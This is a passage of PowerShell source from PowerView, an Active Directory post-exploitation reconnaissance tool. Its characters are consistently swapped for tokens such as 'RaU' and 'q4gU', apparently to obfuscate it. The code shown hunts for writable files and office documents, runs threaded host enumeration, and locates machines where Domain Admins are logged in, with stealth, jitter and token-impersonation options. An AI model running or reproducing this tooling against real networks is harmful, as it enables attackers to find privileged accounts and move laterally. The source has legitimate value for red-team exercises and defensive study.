        [Switch]
        RaUOfficeDocs,

        [Parameter(ParameterSetName = q4gUFreshEXEsq4gU)]
        [Switch]
        RaUFreshEXEs,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [Switch]
        RaUExcludeFolders,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [Switch]
        RaUExcludeHidden,

        [Switch]
        RaUCheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments =  @{
            q4gURecurseq4gU = RaUTrue
            q4gUErrorActionq4gU = q4gUSilentlyContinueq4gU
            q4gUIncludeq4gU = RaUInclude
        }
        if (RaUPSBoundParameters[q4gUOfficeDocsq4gU]) {
            RaUSearcherArguments[q4gUIncludeq4gU] = @(q4gU*.docq4gU, q4gU*.docxq4gU, q4gU*.xlsq4gU, q4gU*.xlsxq4gU, q4gU*.pptq4gU, q4gU*.pptxq4gU)
        }
        elseif (RaUPSBoundParameters[q4gUFreshEXEsq4gU]) {
            # find .exeq4gUs accessed within the last 7 days
            RaULastAccessTime = (Get-Date).AddDays(-7).ToString(q4gUMM/dd/yyyyq4gU)
            RaUSearcherArguments[q4gUIncludeq4gU] = @(q4gU*.exeq4gU)
        }
        RaUSearcherArguments[q4gUForceq4gU] = -not RaUPSBoundParameters[q4gUExcludeHiddenq4gU]

        RaUMappedComputers = @{}

        function Test-Write {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]RaUPath)
            try {
                RaUFiletest = [IO.File]::OpenWrite(RaUPath)
                RaUFiletest.Close()
                RaUTrue
            }
            catch {
                RaUFalse
            }
        }
    }

    PROCESS {
        ForEach (RaUTargetPath in RaUPath) {
            if ((RaUTargetPath -Match q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU) -and (RaUPSBoundParameters[q4gUCredentialq4gU])) {
                RaUHostComputer = (New-Object System.Uri(RaUTargetPath)).Host
                if (-not RaUMappedComputers[RaUHostComputer]) {
                    # map IPCRaU to this computer if itq4gUs not already
                    Add-RemoteConnection -ComputerName RaUHostComputer -Credential RaUCredential
                    RaUMappedComputers[RaUHostComputer] = RaUTrue
                }
            }

            RaUSearcherArguments[q4gUPathq4gU] = RaUTargetPath
            Get-ChildItem @SearcherArguments wZ5t ForEach-Object {
                # check if weq4gUre excluding folders
                RaUContinue = RaUTrue
                if (RaUPSBoundParameters[q4gUExcludeFoldersq4gU] -and (RaU_.PSIsContainer)) {
                    Write-Verbose Oj8XExcluding: RaU(RaU_.FullName)Oj8X
                    RaUContinue = RaUFalse
                }
                if (RaULastAccessTime -and (RaU_.LastAccessTime -lt RaULastAccessTime)) {
                    RaUContinue = RaUFalse
                }
                if (RaUPSBoundParameters[q4gULastWriteTimeq4gU] -and (RaU_.LastWriteTime -lt RaULastWriteTime)) {
                    RaUContinue = RaUFalse
                }
                if (RaUPSBoundParameters[q4gUCreationTimeq4gU] -and (RaU_.CreationTime -lt RaUCreationTime)) {
                    RaUContinue = RaUFalse
                }
                if (RaUPSBoundParameters[q4gUCheckWriteAccessq4gU] -and (-not (Test-Write -Path RaU_.FullName))) {
                    RaUContinue = RaUFalse
                }
                if (RaUContinue) {
                    RaUFileParams = @{
                        q4gUPathq4gU = RaU_.FullName
                        q4gUOwnerq4gU = RaU((Get-Acl RaU_.FullName).Owner)
                        q4gULastAccessTimeq4gU = RaU_.LastAccessTime
                        q4gULastWriteTimeq4gU = RaU_.LastWriteTime
                        q4gUCreationTimeq4gU = RaU_.CreationTime
                        q4gULengthq4gU = RaU_.Length
                    }
                    RaUFoundFile = New-Object -TypeName PSObject -Property RaUFileParams
                    RaUFoundFile.PSObject.TypeNames.Insert(0, q4gUPowerView.FoundFileq4gU)
                    RaUFoundFile
                }
            }
        }
    }

    END {
        # remove the IPCRaU mappings
        RaUMappedComputers.Keys wZ5t Remove-RemoteConnection
    }
}


########################################################
#
# q4gUMetaq4gU-functions start below
#
########################################################

function New-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [String[]]
        RaUComputerName,

        [Parameter(Position = 1, Mandatory = RaUTrue)]
        [System.Management.Automation.ScriptBlock]
        RaUScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        RaUScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        RaUThreads = 20,

        [Switch]
        RaUNoImports
    )

    BEGIN {
        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        RaUSessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # # RaUSessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        # force a single-threaded apartment state (for token-impersonation stuffz)
        RaUSessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # import the current session stateq4gUs variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if (-not RaUNoImports) {
            # grab all the current variables for this runspace
            RaUMyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            RaUVorbiddenVars = @(q4gU?q4gU,q4gUargsq4gU,q4gUConsoleFileNameq4gU,q4gUErrorq4gU,q4gUExecutionContextq4gU,q4gUfalseq4gU,q4gUHOMEq4gU,q4gUHostq4gU,q4gUinputq4gU,q4gUInputObjectq4gU,q4gUMaximumAliasCountq4gU,q4gUMaximumDriveCountq4gU,q4gUMaximumErrorCountq4gU,q4gUMaximumFunctionCountq4gU,q4gUMaximumHistoryCountq4gU,q4gUMaximumVariableCountq4gU,q4gUMyInvocationq4gU,q4gUnullq4gU,q4gUPIDq4gU,q4gUPSBoundParametersq4gU,q4gUPSCommandPathq4gU,q4gUPSCultureq4gU,q4gUPSDefaultParameterValuesq4gU,q4gUPSHOMEq4gU,q4gUPSScriptRootq4gU,q4gUPSUICultureq4gU,q4gUPSVersionTableq4gU,q4gUPWDq4gU,q4gUShellIdq4gU,q4gUSynchronizedHashq4gU,q4gUtrueq4gU)

            # add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach (RaUVar in RaUMyVars) {
                if (RaUVorbiddenVars -NotContains RaUVar.Name) {
                RaUSessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList RaUVar.name,RaUVar.Value,RaUVar.description,RaUVar.options,RaUVar.attributes))
                }
            }

            # add Functions from current runspace to the InitialSessionState
            ForEach (RaUFunction in (Get-ChildItem Function:)) {
                RaUSessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList RaUFunction.Name, RaUFunction.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        RaUPool = [RunspaceFactory]::CreateRunspacePool(1, RaUThreads, RaUSessionState, RaUHost)
        RaUPool.Open()

        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
        RaUMethod = RaUNull
        ForEach (RaUM in [PowerShell].GetMethods() wZ5t Where-Object { RaU_.Name -eq q4gUBeginInvokeq4gU }) {
            RaUMethodParameters = RaUM.GetParameters()
            if ((RaUMethodParameters.Count -eq 2) -and RaUMethodParameters[0].Name -eq q4gUinputq4gU -and RaUMethodParameters[1].Name -eq q4gUoutputq4gU) {
                RaUMethod = RaUM.MakeGenericMethod([Object], [Object])
                break
            }
        }

        RaUJobs = @()
        RaUComputerName = RaUComputerName wZ5t Where-Object {RaU_ -and RaU_.Trim()}
        Write-Verbose Oj8X[New-ThreadedFunction] Total number of hosts: RaU(RaUComputerName.count)Oj8X

        # partition all hosts from -ComputerName into RaUThreads number of groups
        if (RaUThreads -ge RaUComputerName.Length) {
            RaUThreads = RaUComputerName.Length
        }
        RaUElementSplitSize = [Int](RaUComputerName.Length/RaUThreads)
        RaUComputerNamePartitioned = @()
        RaUStart = 0
        RaUEnd = RaUElementSplitSize

        for(RaUi = 1; RaUi -le RaUThreads; RaUi++) {
            RaUList = New-Object System.Collections.ArrayList
            if (RaUi -eq RaUThreads) {
                RaUEnd = RaUComputerName.Length
            }
            RaUList.AddRange(RaUComputerName[RaUStart..(RaUEnd-1)])
            RaUStart += RaUElementSplitSize
            RaUEnd += RaUElementSplitSize
            RaUComputerNamePartitioned += @(,@(RaUList.ToArray()))
        }

        Write-Verbose Oj8X[New-ThreadedFunction] Total number of threads/partitions: RaUThreadsOj8X

        ForEach (RaUComputerNamePartition in RaUComputerNamePartitioned) {
            # create a Oj8Xpowershell pipeline runnerOj8X
            RaUPowerShell = [PowerShell]::Create()
            RaUPowerShell.runspacepool = RaUPool

            # add the script block + arguments with the given computer partition
            RaUNull = RaUPowerShell.AddScript(RaUScriptBlock).AddParameter(q4gUComputerNameq4gU, RaUComputerNamePartition)
            if (RaUScriptParameters) {
                ForEach (RaUParam in RaUScriptParameters.GetEnumerator()) {
                    RaUNull = RaUPowerShell.AddParameter(RaUParam.Name, RaUParam.Value)
                }
            }

            # create the output queue
            RaUOutput = New-Object Management.Automation.PSDataCollection[Object]

            # kick off execution using the BeginInvok() method that allows queues
            RaUJobs += @{
                PS = RaUPowerShell
                Output = RaUOutput
                Result = RaUMethod.Invoke(RaUPowerShell, @(RaUNull, [Management.Automation.PSDataCollection[Object]]RaUOutput))
            }
        }
    }

    END {
        Write-Verbose Oj8X[New-ThreadedFunction] Threads executingOj8X

        # continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach (RaUJob in RaUJobs) {
                RaUJob.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While ((RaUJobs wZ5t Where-Object { -not RaU_.Result.IsCompleted }).Count -gt 0)

        RaUSleepSeconds = 100
        Write-Verbose Oj8X[New-ThreadedFunction] Waiting RaUSleepSeconds seconds for final cleanup...Oj8X

        # cleanup- make sure we didnq4gUt miss anything
        for (RaUi=0; RaUi -lt RaUSleepSeconds; RaUi++) {
            ForEach (RaUJob in RaUJobs) {
                RaUJob.Output.ReadAll()
                RaUJob.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        RaUPool.Dispose()
        Write-Verbose Oj8X[New-ThreadedFunction] all threads completedOj8X
    }
}


function Find-DomainUserLocation {
<#
.SYNOPSIS

Finds domain machines where specific users are logged into.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default q4gUDomain Adminsq4gU) with Get-DomainGroupMember. Then for each server the
function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
The found user list is compared against the target list, and any matches are
displayed. If -ShowAll is specified, all results are displayed instead of
the filtered set. If -Stealth is specified, then likely highly-trafficed servers
are enumerated with Get-DomainFileServer/Get-DomainController, and session
enumeration is executed only against those servers. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to q4gUDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with q4gU(adminCount=1)q4gU (meaning are/were privileged).

.PARAMETER UserAllowDelegation

Switch. Search for user accounts that are not marked as q4gUsensitive and not allowed for delegationq4gU.

.PARAMETER CheckAccess

Switch. Check if the current user has local admin access to computers where target users are found.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER ShowAll

Switch. Return all user location results instead of filtering based on target
specifications.

.PARAMETER Stealth

Switch. Only enumerate sessions from connonly used target servers.

.PARAMETER StealthSource

The source of target servers to use, q4gUDFSq4gU (distributed file servers),
q4gUDCq4gU (domain controllers), q4gUFileq4gU (file servers), or q4gUAllq4gU (the default).

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserLocation

Searches for q4gUDomain Adminsq4gU by enumerating every computer in the domain.

.EXAMPLE

Find-DomainUserLocation -Stealth -ShowAll

Enumerates likely highly-trafficked servers, performs just session enumeration
against each, and outputs all results.

.EXAMPLE

Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem q4gUWindows 7*q4gU -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
users in dev.testlab.local.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential RaUCred

Searches for domain admin locations in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserLocation
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.UserLocationq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUUserGroupIdentityq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [Alias(q4gUUnconstrainedq4gU)]
        [Switch]
        RaUComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Parameter(ParameterSetName = q4gUUserIdentityq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUUserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUUserSearchBase,

        [Parameter(ParameterSetName = q4gUUserGroupIdentityq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUGroupNameq4gU, q4gUGroupq4gU)]
        [String[]]
        RaUUserGroupIdentity = q4gUDomain Adminsq4gU,

        [Alias(q4gUAdminCountq4gU)]
        [Switch]
        RaUUserAdminCount,

        [Alias(q4gUAllowDelegationq4gU)]
        [Switch]
        RaUUserAllowDelegation,

        [Switch]
        RaUCheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaUStopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Parameter(ParameterSetName = q4gUShowAllq4gU)]
        [Switch]
        RaUShowAll,

        [Switch]
        RaUStealth,

        [String]
        [ValidateSet(q4gUDFSq4gU, q4gUDCq4gU, q4gUFileq4gU, q4gUAllq4gU)]
        RaUStealthSource = q4gUAllq4gU,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {

        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) { RaUComputerSearcherArguments[q4gUUnconstrainedq4gU] = RaUUnconstrained }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUUserSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUsamaccountnameq4gU
        }
        if (RaUPSBoundParameters[q4gUUserIdentityq4gU]) { RaUUserSearcherArguments[q4gUIdentityq4gU] = RaUUserIdentity }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
        if (RaUPSBoundParameters[q4gUUserLDAPFilterq4gU]) { RaUUserSearcherArguments[q4gULDAPFilterq4gU] = RaUUserLDAPFilter }
        if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUUserSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
        if (RaUPSBoundParameters[q4gUUserAdminCountq4gU]) { RaUUserSearcherArguments[q4gUAdminCountq4gU] = RaUUserAdminCount }
        if (RaUPSBoundParameters[q4gUUserAllowDelegationq4gU]) { RaUUserSearcherArguments[q4gUAllowDelegationq4gU] = RaUUserAllowDelegation }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUUserSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUUserSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUUserSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUUserSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUUserSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUUserSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUTargetComputers = @()

        # first, build the set of computers to enumerate
        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = @(RaUComputerName)
        }
        else {
            if (RaUPSBoundParameters[q4gUStealthq4gU]) {
                Write-Verbose Oj8X[Find-DomainUserLocation] Stealth enumeration using source: RaUStealthSourceOj8X
                RaUTargetComputerArrayList = New-Object System.Collections.ArrayList

                if (RaUStealthSource -match q4gUFilewZ5tAllq4gU) {
                    Write-Verbose q4gU[Find-DomainUserLocation] Querying for file serversq4gU
                    RaUFileServerSearcherArguments = @{}
                    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUFileServerSearcherArguments[q4gUDomainq4gU] = RaUDomain }
                    if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUFileServerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
                    if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUFileServerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
                    if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUFileServerSearcherArguments[q4gUServerq4gU] = RaUServer }
                    if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUFileServerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
                    if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUFileServerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
                    if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUFileServerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
                    if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUFileServerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
                    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUFileServerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
                    RaUFileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if (RaUFileServers -isnot [System.Array]) { RaUFileServers = @(RaUFileServers) }
                    RaUTargetComputerArrayList.AddRange( RaUFileServers )
                }
                if (RaUStealthSource -match q4gUDFSwZ5tAllq4gU) {
                    Write-Verbose q4gU[Find-DomainUserLocation] Querying for DFS serversq4gU
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # RaUComputerName += Get-DomainDFSShare -Domain RaUDomain -Server RaUDomainController wZ5t ForEach-Object {RaU_.RemoteServerName}
                }
                if (RaUStealthSource -match q4gUDCwZ5tAllq4gU) {
                    Write-Verbose q4gU[Find-DomainUserLocation] Querying for domain controllersq4gU
                    RaUDCSearcherArguments = @{
                        q4gULDAPq4gU = RaUTrue
                    }
                    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUDCSearcherArguments[q4gUDomainq4gU] = RaUDomain }
                    if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUDCSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
                    if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUDCSearcherArguments[q4gUServerq4gU] = RaUServer }
                    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUDCSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
                    RaUDomainControllers = Get-DomainController @DCSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
                    if (RaUDomainControllers -isnot [System.Array]) { RaUDomainControllers = @(RaUDomainControllers) }
                    RaUTargetComputerArrayList.AddRange( RaUDomainControllers )
                }
                RaUTargetComputers = RaUTargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose q4gU[Find-DomainUserLocation] Querying for all computers in the domainq4gU
                RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose Oj8X[Find-DomainUserLocation] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-DomainUserLocation] No hosts found to enumerateq4gU
        }

        # get the current user so we can ignore it in the results
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaUCurrentUser = RaUCredential.GetNetworkCredential().UserName
        }
        else {
            RaUCurrentUser = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if (RaUPSBoundParameters[q4gUShowAllq4gU]) {
            RaUTargetUsers = @()
        }
        elseif (RaUPSBoundParameters[q4gUUserIdentityq4gU] -or RaUPSBoundParameters[q4gUUserLDAPFilterq4gU] -or RaUPSBoundParameters[q4gUUserSearchBaseq4gU] -or RaUPSBoundParameters[q4gUUserAdminCountq4gU] -or RaUPSBoundParameters[q4gUUserAllowDelegationq4gU]) {
            RaUTargetUsers = Get-DomainUser @UserSearcherArguments wZ5t Select-Object -ExpandProperty samaccountname
        }
        else {
            RaUGroupSearcherArguments = @{
                q4gUIdentityq4gU = RaUUserGroupIdentity
                q4gURecurseq4gU = RaUTrue
            }
            if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUGroupSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
            if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUGroupSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUGroupSearcherArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUGroupSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
            if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUGroupSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
            if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUGroupSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
            if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUGroupSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUGroupSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
            RaUTargetUsers = Get-DomainGroupMember @GroupSearcherArguments wZ5t Select-Object -ExpandProperty MemberName
        }

        Write-Verbose Oj8X[Find-DomainUserLocation] TargetUsers length: RaU(RaUTargetUsers.Length)Oj8X
        if ((-not RaUShowAll) -and (RaUTargetUsers.Length -eq 0)) {
            throw q4gU[Find-DomainUserLocation] No users found to targetq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUTargetUsers, RaUCurrentUser, RaUStealth, RaUTokenHandle)

            if (RaUTokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                RaUNull = Invoke-UserImpersonation -TokenHandle RaUTokenHandle -Quiet
            }

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    RaUSessions = Get-NetSession -ComputerName RaUTargetComputer
                    ForEach (RaUSession in RaUSessions) {
                        RaUUserName = RaUSession.UserName
                        RaUCName = RaUSession.CName

                        if (RaUCName -and RaUCName.StartsWith(q4gUScKjScKjq4gU)) {
                            RaUCName = RaUCName.TrimStart(q4gUScKjq4gU)
                        }

                        # make sure we have a result, and ignore computerRaU sessions
